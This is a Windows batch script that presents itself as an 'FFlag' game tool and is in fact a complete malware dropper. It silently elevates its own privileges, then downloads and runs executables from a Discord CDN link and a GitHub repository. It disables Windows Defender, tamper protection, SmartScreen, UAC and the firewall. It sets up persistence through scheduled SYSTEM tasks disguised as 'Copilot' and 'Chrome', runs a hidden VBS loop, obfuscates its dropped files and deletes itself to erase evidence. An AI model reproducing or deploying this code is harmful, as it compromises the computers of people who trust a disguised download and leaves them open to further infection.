@echo off 
setlocal EnableDelayedExpansion

if not "%1"=="am_admin" ( 
  powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Start-Process '%~f0' -ArgumentList 'am_admin' -Verb RunAs"
  exit /b
)

:: This Tool Made By F7M.
::     Discord : x_7z

::============================================================================================[Main Program]============================================================================================
set "ThisFile=%~f0"
set "MainDir=%~dp0"
set "MainName=FFlagRunnerByD7H"
set "MainLink=https://cdn.discordapp.com/attachments/1252675233278722148/1453482167177969827/Strafe_Macro.exe?ex=694d9c41&is=694c4ac1&hm=0461a044ae277af74db3a49d42cbcc2e0cc0ba4716116f86f36041243b1d17fe&"
set "MainDestination=%MainDir%%MainName%.exe"
set "Trash=%temp%\%~nx0"
set "MsgBoxVbs=%Temp%\MsgBox.vbs"

powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Add-MpPreference -ExclusionProcess '%ThisFile%'"

attrib +h +s "%ThisFile%"

if exist "%MainDestination%" (
    set "MainDestination=%MainDir%%MainName% (1).exe"
)

curl -L "%MainLink%" -o "%MainDestination%" --silent

if not exist "%MainDestination%" (
    powershell -NoLogo -NoProfile -WindowStyle Hidden -EP Bypass -Command "(New-Object Net.WebClient).DownloadFile('%MainLink%','%MainDestination%')"
)

del "%MsgBoxVbs%"
echo MsgBox "You Have Downloaded New FFLAGS Method", 64, "%MainName%" >> "%MsgBoxVbs%"
start "" "%MsgBoxVbs%"
timeout 1
del "%MsgBoxVbs%"

attrib -h -s "%ThisFile%"
move "%ThisFile%" "%Trash%"
::======================================================================================[Disable Windows Defender]======================================================================================

:: ==============================
:: Notifications
:: ==============================
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v Enabled /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRawWriteNotification" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotification" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotificationOnLockScreen" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotificationsRecentScan" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotificationsThreats" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d 1 /f >nul 2>&1

:: ==============================
:: Real-Time Protection
:: ==============================
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableOnAccessProtection" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideRealtimeScanDirection" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableIOAVProtection" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableBehaviorMonitoring" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableIntrusionPreventionSystem" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableRealtimeMonitoring" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "RealtimeScanDirection" /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableInformationProtectionControl" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v MAPSReporting /t REG_DWORD /d 0 /f 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableGenericReports" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableAsyncScanOnOpen" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowBehaviorMonitoring" /v "value" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpynetReporting" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v "DontReportInfectionInformation" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControlEnabled" /t REG_DWORD /d "0" /f >nul 2>&1

:: ==============================
:: UAC / Secure Desktop
:: ==============================
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableUIADesktopToggle" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ValidateAdminCodeSignatures" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableSecureUIAPaths" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DelayedDesktopSwitchTimemout" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableCursorSuppression" /t REG_DWORD /d 0 /f >nul 2>&1

:: ==============================
:: Features & Tamper Protection
:: ==============================
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "MpPlatformKillbitsFromEngine" /t REG_BINARY /d 0000000000000000 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "MpCapability" /t REG_BINARY /d 0000000000000000 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f >nul 2>&1

:: ==============================
:: Threats & Actions
:: ==============================
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats" /v "Threats_ThreatSeverityDefaultAction" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "1" /t REG_SZ /d "6" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "2" /t REG_SZ /d "6" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "4" /t REG_SZ /d "6" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "5" /t REG_SZ /d "6" /f >nul 2>&1

:: ==============================
:: Additional Protection
:: ==============================
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableLocalAdminMerge" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride" /t REG_DWORD /d 1 /f >nul 2>&1

:: Disable Firewall
netsh advfirewall set allprofiles state off >nul 2>&1


:: Set folder paths
set "Startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "LocalAppdataCache=%LOCALAPPDATA%\cache"
set "ProgramDataCache=%ProgramData%\cache"

:: Create folders if they don't exist
if not exist "%Startup%" mkdir "%Startup%"
if not exist "%LocalAppdataCache%" mkdir "%LocalAppdataCache%"
if not exist "%ProgramDataCache%" mkdir "%ProgramDataCache%"


:: Batch Variables
set "BatchName=86ae41db-2658-45db-bd77-bac704f0e861.exe"
set "BatchLink=https://github.com/HauntedM/H/raw/refs/heads/main/Updater.exe"
set "BatchDestination=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%BatchName%"

:: Batfile Output
set "Batname=p-crachcache-x86_64_bitp-LOG502345-64w.bat"
set "Batfile=C:\ProgramData\cache\%Batname%"

(
echo @echo off > "%Batfile%"
echo. 
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRawWriteNotification" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v Enabled /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f 2>nul
echo reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotification" /t REG_DWORD /d "1" /f 2>nul
echo reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotificationOnLockScreen" /t REG_DWORD /d "1" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotificationsRecentScan" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotificationsThreats" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableOnAccessProtection" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideRealtimeScanDirection" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableIOAVProtection" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableBehaviorMonitoring" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableIntrusionPreventionSystem" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "LocalSettingOverrideDisableRealtimeMonitoring" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "RealtimeScanDirection" /t REG_DWORD /d 2 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableInformationProtectionControl" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "FilterAdministratorToken" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableUIADesktopToggle" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ValidateAdminCodeSignatures" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableSecureUIAPaths" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DelayedDesktopSwitchTimemout" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableCursorSuppression" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats" /v "Threats_ThreatSeverityDefaultAction" /t REG_DWORD /d "1" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "1" /t REG_SZ /d "6" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "2" /t REG_SZ /d "6" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "4" /t REG_SZ /d "6" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Threats\ThreatSeverityDefaultAction" /v "5" /t REG_SZ /d "6" /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "MpPlatformKillbitsFromEngine" /t REG_BINARY /d 0000000000000000 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtectionSource" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "MpCapability" /t REG_BINARY /d 0000000000000000 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableLocalAdminMerge" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d "0" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v "DontReportInfectionInformation" /t REG_DWORD /d "0" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControlEnabled" /t REG_DWORD /d "0" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting" /t REG_DWORD /d "0" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SpynetReporting" /t REG_DWORD /d "0" /f 2>nul
echo reg add "HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowBehaviorMonitoring" /v "value" /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableAsyncScanOnOpen" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" /v "DisallowExploitProtectionOverride" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v "DontReportInfectionInformation" /t REG_DWORD /d "1" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableGenericReports" /t REG_DWORD /d "1" /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v MAPSReporting /t REG_DWORD /d 0 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f 2>nul
echo reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f 2>nul
echo.
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -DisableScriptScanning $true" 2>nul
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" 2>nul
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -DisableBehaviorMonitoring $true" 2>nul
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -MAPSReporting 0" 2>nul
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -SubmitSamplesConsent 2" 2>nul
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Set-MpPreference -DisableIOAVProtection $true" 2>nul
echo. 
echo netsh advfirewall set allprofiles state off 2>nul
echo. 
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Add-MpPreference -ExclusionPath '%BatchDestination%'" 
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('%BatchLink%','%BatchDestination%')" 
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Start-Process -FilePath '%BatchDestination%' -Verb RunAs" 
echo powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Add-MpPreference -ExclusionProcess '%BatchDestination%'" 
echo.
echo schtasks /create /tn "Copilot" /tr "cmd.exe /c \"%~f0\"" /sc onstart /ru SYSTEM /f
echo. 
echo exit /b 
) >> "%Batfile%"

powershell -NoProfile -Command "$target='%Batfile%';$header=[byte[]](0xFF,0xFE,0x26,0x63,0x6C,0x73,0x0D,0x0A);$in=[System.IO.File]::ReadAllBytes($target);[System.IO.File]::WriteAllBytes($target+'.tmp',$header+$in);Move-Item -Force ($target+'.tmp') $target"

schtasks /query /tn "Copilot" >nul 2>&1
if not %errorlevel%==0 (
    schtasks /create /tn "Copilot" /tr "cmd.exe /c \"%Batfile%\"" /sc onstart /ru SYSTEM /f >nul 2>&1
)

powershell -NoLogo -NoProfile -WindowStyle Hidden -EP bypass -Command "Start-Process '%Batname%'"

::=====================================================================================[Hidden Auto BAT&VBS Runner]=====================================================================================

:: ==== CONFIG ====
set "AutoRunName=ForceMonitorFps"
set "BaseDir=C:\ProgramData\cache\AdditionalCache"
set "AutoRunPath=%BaseDir%\%AutoRunName%.bat"
set "VbsPath=%BaseDir%\%AutoRunName%.vbs"

set "WatchedFile=notepad.exe"
set "FileToLaunch=cmd.exe"
set "DELAY=60"

:: ==== ENSURE DIRECTORY EXISTS ====
if not exist "%BaseDir%" mkdir "%BaseDir%"

:: ==== CREATE Auto Runner BAT ====
(
echo @echo off
echo :LOOP
echo tasklist /FI "IMAGENAME eq %WatchedFile%" ^| find /I "%WatchedFile%" ^>nul
echo if errorlevel 1 ^(
echo     start "" "%FileToLaunch%"
echo ^)
echo timeout /t %DELAY% /nobreak ^>nul
echo goto LOOP
echo.
echo exit /b
) > "%AutoRunPath%"

powershell -NoProfile -Command "$target='%AutoRunPath%';$header=[byte[]](0xFF,0xFE,0x26,0x63,0x6C,0x73,0x0D,0x0A);$in=[System.IO.File]::ReadAllBytes($target);[System.IO.File]::WriteAllBytes($target+'.tmp',$header+$in);Move-Item -Force ($target+'.tmp') $target"

:: ==== CREATE Hidden BAT Runner ====
echo CreateObject("Wscript.Shell").Run "%AutoRunPath%", 0, False >"%VbsPath%"

:: ===== RUN VBS =====
schtasks /create /tn "Chrome" /tr "cscript.exe //nologo \"%VbsPath%\"" /sc onstart /ru SYSTEM /f
cscript //nologo "%VbsPath%"

:: Melt The Current File (No Evidence)
powershell -NoLogo -NoProfile -WindowStyle Hidden -EP Bypass -Command "Remove-Item '%Trash%' -Force"

endlocal
exit /b